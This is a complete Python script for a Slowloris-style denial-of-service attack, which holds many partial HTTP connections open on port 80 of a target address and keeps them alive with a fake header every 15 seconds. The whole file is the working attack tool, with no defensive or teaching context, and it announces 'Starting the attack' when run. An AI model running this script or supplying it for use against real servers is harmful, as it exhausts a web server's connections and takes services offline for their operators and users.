#!/usr/bin/env python
import socket
import random
import time
import sys


def createsocket(ip):
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip,80))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode("utf-8"))
    headers=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36","Accept-language :fr-FR,fr,q=0.5"]

    for header in headers:
        s.send("{}\r\n".format(header).encode("utf-8"))
    return s

def main():
    if len(sys.argv) != 3:
        print("Usage : {} adress nbsockets".format(sys.argv[0]))
        return

    sockets = []

    ip = sys.argv[1]
    nbsockets=int(sys.argv[2])

    for _ in range(nbsockets):
        try:
            s = createsocket(ip)
        except socket.error:
            break
        sockets.append(s)

    print("Starting the attack on {} with {} connections".format(ip, nbsockets))
    while True:
        print("Sending a new packet...")
        for s in list(sockets):
            try:
                s.send("X-a: {}\r\n".format(random.randint(1,5000)).encode("utf-8"))
            except socket.error:
                sockets.remove(s)

        for _ in range(nbsockets - len(sockets)):
            try:
                sn = createsocket(ip)
                if sn:
                    sockets.append(sn)
            except socket.error:
                break
        time.sleep(15)


if __name__ == "__main__":
    main()
